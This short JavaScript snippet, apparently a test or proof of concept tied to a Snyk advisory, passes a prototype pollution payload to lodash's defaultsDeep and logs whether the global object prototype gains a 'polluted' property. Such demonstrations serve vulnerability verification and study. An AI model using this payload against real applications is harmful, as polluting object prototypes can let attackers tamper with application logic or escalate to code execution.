// //https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
// test("prototype pollution in lodash", () => {
  const mergeFn = require("lodash").defaultsDeep;
  const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
console.log({}.polluted);

  mergeFn({}, JSON.parse(payload));

console.log({}.polluted);
// });
